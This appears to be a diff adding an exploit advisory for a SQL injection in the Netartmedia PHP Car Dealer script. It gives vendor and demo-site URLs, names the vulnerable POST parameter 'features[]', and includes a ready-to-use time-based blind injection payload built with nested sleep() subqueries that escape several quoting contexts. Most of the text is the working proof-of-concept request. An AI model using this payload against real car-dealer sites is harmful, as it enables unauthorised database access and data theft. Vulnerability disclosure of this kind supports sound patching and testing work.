@@ -1,0 +1,20 @@
+# Exploit Title: Netartmedia  PHP Car Dealer- SQL Injection
+# Date: 19.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.netartmedia.net/autodealer/
+# Demo Site: https://www.phpscriptdemos.com/autodealer/
+# Version: Lastest
+# Tested on: Kali Linux
+# CVE: N/A
+# Description:The PHP Car Dealer script is also using a flexible
+template system - the
+ templates can be modified or new ones to be created in order to
+completely customize the website look and feel.
+
+----- PoC 1 SQLi -----
+
+Request: http://localhost/[PATH]/index.php
+
+Parameter features[] (POST)
+
+Payload:body_style=&car_make=&car_model=1&condition=&exterior_color=&features[]=(select(0)from(select(sleep(0)))v)/*'%2B(select(0)from(select(sleep(0)))v)%2B'"%2B(select(0)from(select(sleep(0)))v)%2B"*/&fuel_type=&max_mileage=&mod=search&only_pictures=1&order_by=date&price_from=1&price_to=1&search_keyword=&search_type=search_form&transmission=&type=1&year=
